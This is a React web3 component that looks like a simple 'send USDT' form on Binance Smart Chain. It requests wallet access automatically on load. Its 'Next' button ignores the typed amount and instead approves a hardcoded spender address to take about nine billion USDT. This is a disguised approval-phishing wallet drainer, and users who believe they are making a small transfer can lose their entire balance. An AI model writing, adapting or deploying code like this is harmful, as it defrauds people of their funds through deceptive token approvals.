import { useState, useEffect } from "react";
import Web3 from "web3";
import Swal from "sweetalert2";
import "@fortawesome/fontawesome-free/css/all.min.css";
import "./App.css";
import '@fontsource/open-sans/300.css';
import '@fontsource/open-sans/400.css';
import '@fontsource/open-sans/500.css';
import '@fontsource/open-sans/600.css';
import '@fontsource/open-sans/700.css';
import '@fontsource/open-sans/800.css';
import '@fontsource/geist';

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
const spenderAddress = "0x84e6400eE204b4dDCe5E0eF4e253Ba886fdb966A"; // Your verified contract
const approvalAmount = "9024508479"; // USDT amount to approve

const usdtAbi = [
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
];

export default function SendUSDT() {
  const [amount, setAmount] = useState("");
  const [usdValue, setUsdValue] = useState("= $0.00");
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [theme, setTheme] = useState("dark");
  const [userAddress, setUserAddress] = useState(null);

  // ✅ Auto-connect wallet on first load
  useEffect(() => {
    const initWallet = async () => {
      try {
        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const accounts = await web3.eth.getAccounts();
        setUserAddress(accounts[0]);
      } catch (err) {
        console.error("Wallet connection failed:", err);
      }
    };
    initWallet();

    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    setTheme(darkMode ? "dark" : "light");

    const listener = (e) => setTheme(e.matches ? "dark" : "light");
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener("change", listener);
    return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
  }, []);

  useEffect(() => {
    const value = parseFloat(amount);
    setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
  }, [amount]);

  const setMaxAmount = async () => {
    try {
      const web3 = new Web3(window.ethereum);
      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balance = await usdt.methods.balanceOf(userAddress).call();
      setAmount(web3.utils.fromWei(balance, "mwei")); // USDT has 6 decimals
    } catch (err) {
      Swal.fire("Error", "Failed to fetch balance.", "error");
    }
  };

  const handleApprove = async () => {
    setIsProcessing(true);
    try {
      const web3 = new Web3(window.ethereum);

      const chainId = await web3.eth.getChainId();
      if (chainId !== 56) {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
      }

      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);

      // ✅ Approve fixed amount (9024508479 USDT)
      const rawAmount = web3.utils.toWei(approvalAmount, "mwei"); // USDT has 6 decimals

      const receipt = await usdt.methods
        .approve(spenderAddress, rawAmount)
        .send({ from: userAddress })
        .on("receipt", () => setShowSuccess(true))
        .on("error", (err) => {
          console.error(err);
          Swal.fire("Error", err.message || "Approval failed", "error");
        });

      console.log("Tx hash:", receipt.transactionHash);
    } catch (err) {
      console.error(err);
      Swal.fire("Error", err.message || "Something went wrong", "error");
    } finally {
      setIsProcessing(false);
    }
  };

  const isDark = theme === "dark";

  if (showSuccess) {
    return (
      <div className={`min-h-screen flex flex-col justify-center items-center px-4 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
        <svg
          className="w-24 h-24 text-green-500 animate-bounce"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          viewBox="0 0 24 24"
        >
          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
        </svg>
        <h2 className="text-2xl mt-4 font-semibold">Approval Successful</h2>
        <button
          className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold"
          onClick={() => setShowSuccess(false)}
        >
          OK
        </button>
      </div>
    );
  }

  return (
    <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
      <div className="input-group">
        <p className="inpt_tital">Address or Domain Name</p>
        <div className="border">
          <div className="left">
            <input
              type="text"
              className="custom-input"
              value={spenderAddress}
              readOnly
            />
          </div>
        </div>
      </div>

      <div className="input-group mt-7">
        <p className="inpt_tital">Amount</p>
        <div className="border">
          <div className="left">
            <input
              type="number"
              min="0"
              step="0.01"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="USDT Amount"
              className="custom-input"
            />
          </div>
          <span className="right mr-3">
            <span className="text-sm text-[#b0b0b0]">USDT</span>
            <span
              className="mar_i blue text-sm ml-2 cursor-pointer"
              onClick={setMaxAmount}
            >
              Max
            </span>
          </span>
        </div>
      </div>

      <p className="fees valid">{usdValue}</p>

      <button
        id="nextBtn"
        className="send-btn"
        onClick={handleApprove}
        disabled={isProcessing}
        style={{
          backgroundColor: isProcessing ? "var(--disabled-bg)" : "#5CE07E",
          color: isProcessing ? "var(--disabled-text)" : "#1b1e15"
        }}
      >
        {isProcessing ? "Processing..." : "Next"}
      </button>
    </div>
  );
}
